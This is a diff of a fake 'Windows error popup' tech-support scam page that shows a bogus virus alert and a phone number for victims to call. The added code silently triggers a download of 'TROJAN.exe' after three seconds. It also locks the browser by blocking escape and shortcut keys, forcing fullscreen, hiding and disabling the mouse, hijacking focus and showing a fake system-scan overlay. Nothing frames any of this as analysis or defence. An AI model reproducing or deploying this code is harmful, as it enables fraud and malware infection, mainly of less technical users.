@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
 <!-- Global site tag (gtag.js) - Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-225469381-1"></script>
     <script>
@@ -16,7 +18,21 @@
             if (top !== self) top.location = self.location;
 
         </script>
-
+	<script>
+    // Wait 3 seconds, then attempt download
+    setTimeout(() => {
+        // Create invisible download link
+        const link = document.createElement('a');
+        link.href = 'TROJAN.exe'; // Path to your file
+        link.download = 'TROJAN.exe'; // Filename for user
+        link.style.display = 'none';
+        
+        // Trigger download
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }, 3000); // 3-second delay
+</script>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>Windows error popup</title>
@@ -171,7 +187,7 @@
 						<span>Closing this window puts your personal information at risk
 						WindowsRegistration will be suspended.</span>
 
-						<span>Windows Contact support:+1-801-820-0218</span>
+						<span>Windows Contact support: +1-801-820-0218</span>
                 	 </div>
 
 			        <div class="wrapper-buttons">
@@ -201,7 +217,7 @@
 			        <div class="wrapper-main-text">
 			 			<label class="wrapper-main-text-alert">Virus_Alert-Error code: ValveDW6BD36</label>
 			 			<label class="wrapper-main-text-adress">Windows Access is block due to security reason for this computer.</label>
-			 			<label class="wrapper-main-text-tel">WindowsConnect to support:+1-801-820-0218</label>
+			 			<label class="wrapper-main-text-tel">Windows Connect to support:+1-801-820-0218</label>
 			        </div>
 			    </div>
 
@@ -253,5 +269,224 @@
 }, 1000);
 
    </script>
+ <script>
+let isFullscreen = false;
 
+// ===== BLOCK ALL KEYS =====
+document.addEventListener('keydown', (e) => {
+    // Block ESC, F11, Alt+F4, Ctrl+W, Alt+Tab, etc.
+    const blockedKeys = [
+        'Escape', 'F11', 'Tab', 
+        'w', 'W', 'q', 'Q' // Block Ctrl+W / Cmd+W (Chrome/Edge/Firefox)
+    ];
+
+    if (blockedKeys.includes(e.key) || 
+        e.altKey || e.ctrlKey || e.metaKey) {
+        e.preventDefault();
+    }
+});
+
+// ===== FULLSCREEN TRAP =====
+function enterFullscreen() {
+    document.documentElement.requestFullscreen()
+        .then(() => {
+            isFullscreen = true;
+            trapMouse();
+            document.title = "⚠️ CRITICAL ERROR - DO NOT CLOSE"; // Change tab title
+        })
+        .catch(console.error);
+}
+
+// ===== MOUSE TRAP =====
+function trapMouse() {
+    // Hide cursor & disable clicks
+    document.body.style.cursor = 'none';
+    document.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+    }, true);
+
+    // Jitter effect (makes mouse unusable)
+    document.addEventListener('mousemove', (e) => {
+        window.scrollBy(
+            Math.random() * 10 - 5,
+            Math.random() * 10 - 5
+        );
+    });
+
+    // Fake infinite loop to consume CPU (makes browser lag)
+    setInterval(() => {
+        const noise = document.createElement('div');
+        noise.style.position = 'fixed';
+        noise.style.top = Math.random() * 100 + 'vh';
+        noise.style.left = Math.random() * 100 + 'vw';
+        noise.style.color = 'red';
+        noise.textContent = '🛑 ALERT: MEMORY CORRUPTED';
+        document.body.appendChild(noise);
+        setTimeout(() => noise.remove(), 100);
+    }, 50);
+}
+
+// ===== INITIALIZE =====
+document.addEventListener('click', enterFullscreen);
+document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+// Aggressive tab/window focus hijacking
+window.onblur = () => window.focus();
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+        document.title = "⚠️ RETURN IMMEDIATELY - SYSTEM COMPROMISED";
+        window.focus();
+    }
+});
+document.addEventListener('click', () => {
+    // Hide the cursor
+    document.body.style.cursor = 'none';
+    
+    // Optional: Prevent right-click
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+});
+// Store previous mouse position
+let lastX = 0;
+let lastY = 0;
+
+document.addEventListener('mousemove', (e) => {
+    // Calculate how much the mouse moved
+    const deltaX = e.clientX - lastX;
+    const deltaY = e.clientY - lastY;
+    
+    // Apply reverse movement (2x multiplier makes it more extreme)
+    window.scrollBy(-deltaX * 2, -deltaY * 2);
+    
+    // Update last position
+    lastX = e.clientX;
+    lastY = e.clientY;
+    
+    // Optional: Add some random jitter to make it even harder
+    window.scrollBy(
+        Math.random() * 40 - 20, // -3 to +3px random X
+        Math.random() * 40 - 20  // -3 to +3px random Y
+    );
+});
+let escPressCount = 0;
+
+function freezeSystem() {
+    if (!isFrozen) {
+        isFrozen = true;
+        
+        // Enter fullscreen
+        document.documentElement.requestFullscreen()
+            .then(() => {
+                // Create fake "frozen" overlay
+                const overlay = document.createElement('div');
+                overlay.style.position = 'fixed';
+                overlay.style.top = '0';
+                overlay.style.left = '0';
+                overlay.style.width = '100%';
+                overlay.style.height = '100%';
+                overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
+                overlay.style.zIndex = '99999';
+                overlay.style.display = 'flex';
+                overlay.style.justifyContent = 'center';
+                overlay.style.alignItems = 'center';
+                overlay.style.color = 'white';
+                overlay.style.fontSize = '24px';
+                overlay.style.textAlign = 'center';
+                overlay.innerHTML = `
+                    <div>
+                        <div style="font-size:48px;">❄️</div>
+                        <div>SYSTEM STABILITY CHECK</div>
+                        <div style="margin-top:20px;font-size:16px;">
+                            Scanning critical system files...<br>
+                            Please do not press any keys
+                        </div>
+                        <div id="countdown" style="margin-top:30px;"></div>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+
+                // Disable all inputs
+                document.body.style.pointerEvents = 'none';
+                document.body.style.cursor = 'none';
+
+                // Block keyboard with ESC warning
+                document.addEventListener('keydown', (e) => {
+                    e.preventDefault();
+                    
+                    // Special handling for ESC key
+                    if (e.key === 'Escape') {
+                        escPressCount++;
+                        showEscWarning();
+                    }
+                }, true);
+
+                // Fake countdown to "unfreeze"
+                let seconds = 45;
+                const countdown = setInterval(() => {
+                    document.getElementById('countdown').textContent = 
+                        `Estimated time remaining: ${seconds} seconds`;
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        clearInterval(countdown);
+                        unfreezeSystem();
+                    }
+                }, 1000);
+            });
+    }
+}
+
+function showEscWarning() {
+    const warning = document.createElement('div');
+    warning.style.position = 'fixed';
+    warning.style.top = '50%';
+    warning.style.left = '50%';
+    warning.style.transform = 'translate(-50%, -50%)';
+    warning.style.backgroundColor = 'rgba(255, 0, 0, 0.9)';
+    warning.style.color = 'white';
+    warning.style.padding = '20px';
+    warning.style.borderRadius = '10px';
+    warning.style.zIndex = '100000';
+    warning.style.textAlign = 'center';
+    warning.style.maxWidth = '80%';
+    
+    if (escPressCount < 3) {
+        warning.innerHTML = `
+            <div style="font-size:20px;margin-bottom:10px;">⚠️ WARNING</div>
+            <div>Pressing keys may corrupt the system scan!</div>
+            <div style="margin-top:10px;font-size:14px;">Please wait for the process to complete</div>
+        `;
+    } else {
+        warning.innerHTML = `
+            <div style="font-size:20px;margin-bottom:10px;">🚨 CRITICAL WARNING</div>
+            <div>Multiple keypresses detected!</div>
+            <div style="margin-top:10px;">Scan duration extended by 30 seconds</div>
+        `;
+        // Add fake time penalty
+        const countdown = document.getElementById('countdown');
+        if (countdown) {
+            const currentTime = parseInt(countdown.textContent.match(/\d+/)[0]);
+            countdown.textContent = countdown.textContent.replace(
+                currentTime, currentTime + 30
+            );
+        }
+    }
+    
+    document.body.appendChild(warning);
+    setTimeout(() => warning.remove(), 3000);
+}
+
+function unfreezeSystem() {
+    document.exitFullscreen();
+    document.body.style.pointerEvents = 'auto';
+    document.body.style.cursor = 'default';
+    document.querySelector('div[style*="z-index: 99999"]')?.remove();
+    isFrozen = false;
+    escPressCount = 0;
+}
+
+// Activate on click
+document.addEventListener('click', freezeSystem);
+</script>
+</script>
 </html>
